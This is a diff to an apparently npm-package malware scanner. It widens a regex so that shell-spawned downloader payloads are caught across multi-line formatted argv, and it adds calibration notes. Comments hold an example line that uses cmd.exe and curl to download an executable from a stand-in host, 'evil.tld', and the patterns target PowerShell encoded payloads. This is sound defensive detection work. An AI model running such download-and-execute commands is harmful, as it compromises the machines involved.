@@ -726,10 +726,45 @@ def _wired_within(first: str, second: str) -> str:
 
 
 #: How far along a spawn call's command line the shell-payload check reads. The
-#: bound is a *line*, not a character window over the file, so the check cannot
-#: run off the end of the call into an unrelated statement — a command line is
-#: written on one line even in a minified bundle.
+#: budget is per *line*: a command line is written on one line even in a
+#: minified bundle, so in a published bundle this is the whole window.
 SHELL_COMMAND_WINDOW = 200
+
+#: How many further lines that check may read across when the call is *not*
+#: written on one (F43). A window bounded to a single line is right for a
+#: bundle and wrong for source: prettier splits
+#: ``spawn("cmd.exe", ["/C", "curl http://evil.tld/a.exe -o a.exe"])`` over four
+#: lines, and the payload then sits outside a one-line window entirely — so the
+#: pre-F43 coverage landed on published bundles and missed readable source.
+#: Six leaves room for a wrapped argv (the shape's own size is four) without
+#: becoming a file-wide search.
+SHELL_ARGV_LINES = 6
+
+#: The distance between a shell binary and its payload, spelled so that crossing
+#: a newline costs something.
+#:
+#: One line is free — the first branch is the pre-F43 window, byte for byte, and
+#: is what a minified bundle matches. Reaching into the following lines is
+#: allowed only through material that cannot be a *different* statement: no
+#: ``;``, no ``{}`` block, no call ``()``, no ``=`` assignment. A formatted argv
+#: is quotes, commas, brackets and flags, and passes; the statement after an
+#: unrelated ``sh -c "npm run build"`` is a call, an assignment or a block, and
+#: does not. That restriction is the whole reason a plain ``[\s\S]`` window was
+#: rejected: it reads the *next* statement's ``curl`` as this call's payload,
+#: which is the failure the F35 wiring window had to be capped for.
+#:
+#: Measured old-vs-new over **500 installed packages / 13,769 real ``.js``
+#: files / 259 MB**: the widening introduces **0** new hits. That is a smaller
+#: corpus than the 2,080 packages F38 was calibrated against — the full sweep is
+#: an open follow-up — so the cross-statement cases are *also* pinned as
+#: fixtures rather than resting on the sample. Throughput is unchanged:
+#: 1.25s new vs 1.26s old over 30.4 MB of real bundles.
+_SHELL_COMMAND_GAP = r"(?:[^\n]{0,%d}?|[^\n;{}()=]{0,%d}?(?:\n[^\n;{}()=]{0,%d}?){1,%d})" % (
+    SHELL_COMMAND_WINDOW,
+    SHELL_COMMAND_WINDOW,
+    SHELL_COMMAND_WINDOW,
+    SHELL_ARGV_LINES,
+)
 
 #: The call forms that start a process, up to and including the opening quote of
 #: their first argument. The three shell shapes below share this prefix and are
@@ -926,8 +961,10 @@ MALWARE_PATTERN_TABLE: Tuple[MalwarePattern, ...] = (
     # * the command line carries a **payload**: a downloader (`cmd.exe /c curl …
     #   && a.exe`) or, for PowerShell only, an encoded one (`-enc`,
     #   `FromBase64String`). Reading past the first string literal to the rest of
-    #   the line is what catches `execFile('cmd.exe', ['/c', 'curl …'])`, which
-    #   the old first-literal-only pattern could not see.
+    #   the command line is what catches `execFile('cmd.exe', ['/c', 'curl …'])`,
+    #   which the old first-literal-only pattern could not see — and reading it
+    #   across a formatted argv (F43, :data:`_SHELL_COMMAND_GAP`) is what keeps
+    #   that true of source and not only of bundles.
     #
     # The union fires on zero of those 2,080 packages and on every malicious
     # fixture, and costs nothing: 0.88s vs the old 1.07s over 23.5 MB of real
@@ -938,9 +975,9 @@ MALWARE_PATTERN_TABLE: Tuple[MalwarePattern, ...] = (
         r"\s*(?:" + _SHELL_BINARY + r")\s*['\"`]\s*(?:\)|,\s*\[\s*\]\s*[,)])"
         # or the command line carries a payload
         r"|[^\n]{0,%d}?(?:" % SHELL_COMMAND_WINDOW
-        + r"(?:" + _SHELL_BINARY + r")[^\n]{0,%d}?(?:" % SHELL_COMMAND_WINDOW
+        + r"(?:" + _SHELL_BINARY + r")" + _SHELL_COMMAND_GAP + r"(?:"
         + _SHELL_PAYLOAD + r")"
-        r"|" + _POWERSHELL + r"[^\n]{0,%d}?(?:" % SHELL_COMMAND_WINDOW
+        r"|" + _POWERSHELL + _SHELL_COMMAND_GAP + r"(?:"
         + _POWERSHELL_ENCODED + r")"
         r")"
         r")",
